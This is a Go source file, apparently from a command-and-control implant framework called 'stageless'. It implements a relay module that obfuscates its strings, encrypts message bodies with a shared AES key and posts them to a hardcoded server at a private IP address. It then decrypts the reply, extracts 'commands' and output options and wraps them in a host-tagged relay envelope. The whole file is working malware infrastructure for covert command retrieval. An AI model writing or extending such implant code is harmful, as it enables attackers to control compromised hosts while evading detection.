// Much like the main loop routine. It is used only by the relay system on
// the last host that forwards the request to the server. In most cases you
// can reuse the same communication logic as the main loop.
//
package relay

import (
	"encoding/json"
	"io"
	"net/http"
	"strings"

	global "stageless/utils"
	"stageless/utils/crypt"
	"stageless/utils/obf"
)

var customServerHost = obf.S("http://192.168.15.10:9090/")

func relayCookies() map[string]string {
	// Returns the cookie map used by the custom relay http client
	return map[string]string{
		obf.S("session"): obf.S("example"),
		obf.S("token"):   obf.S("example"),
	}
}

func relayHeaders() map[string]string {
	// Returns the header map used by the custom relay http client
	return map[string]string{
		obf.S("User-Agent"):       obf.S("Mozilla/5.0"),
		obf.S("X-Custom-Header"): obf.S("example"),
	}
}

func httpPost(url, payload string, cookies, headers map[string]string) (uint16, string) {
	// Sends an http post and returns the status code and body
	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(payload))
	if err != nil {
		return 0, obf.S("")
	}
	req.Header.Set(obf.S("Connection"), obf.S("close"))
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	if len(cookies) > 0 {
		parts := make([]string, 0, len(cookies))
		for key, value := range cookies {
			parts = append(parts, key+obf.S("=")+value)
		}
		req.Header.Set(obf.S("Cookie"), strings.Join(parts, obf.S("; ")))
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return 0, obf.S("")
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return uint16(resp.StatusCode), obf.S("")
	}
	return uint16(resp.StatusCode), string(raw)
}

func postEncrypted(plain string) (uint16, string) {
	// Encrypts the plain body and posts it to the custom server
	wire := crypt.CryptEncryptWithProbe(global.AesKey, plain)
	if wire == "" {
		return 0, obf.S("")
	}
	return httpPost(customServerHost, wire, relayCookies(), relayHeaders())
}

func decryptBody(cipher string) string {
	// Decrypts the cipher body with the shared key
	return crypt.TryCryptDecrypt(global.AesKey, cipher)
}

func RelayHTTPCustomForwardDestiny(_ map[string]any, contentBody string) string {
	// Forwards the body to the custom http server and builds the relay envelope
	if contentBody == "" {
		return ""
	}
	code, body := postEncrypted(contentBody)
	if code != 200 || body == "" {
		return ""
	}
	plain := decryptBody(body)
	if plain == "" {
		return ""
	}

	var parsed any
	if err := json.Unmarshal([]byte(plain), &parsed); err != nil {
		return ""
	}
	content := parsed
	switch node := parsed.(type) {
	case map[string]any:
		if _, ok := node[obf.S("commands")]; ok {
			content = node
		} else if opt, ok := node[obf.S("option")].(string); ok && opt == obf.S("output") {
			content = map[string]any{obf.S("commands"): []any{}}
		}
	case []any:
		echoedOutput := false
		for _, item := range node {
			if m, ok := item.(map[string]any); ok {
				if opt, ok := m[obf.S("option")].(string); ok && opt == obf.S("output") {
					echoedOutput = true
					break
				}
			}
		}
		if echoedOutput {
			content = map[string]any{obf.S("commands"): []any{}}
		}
	}

	wire, err := json.Marshal(map[string]any{
		obf.S("source"):  global.HostTag,
		obf.S("content"): content,
		obf.S("chain"):   []string{global.HostTag},
	})
	if err != nil {
		return obf.S("")
	}
	return string(wire)
}
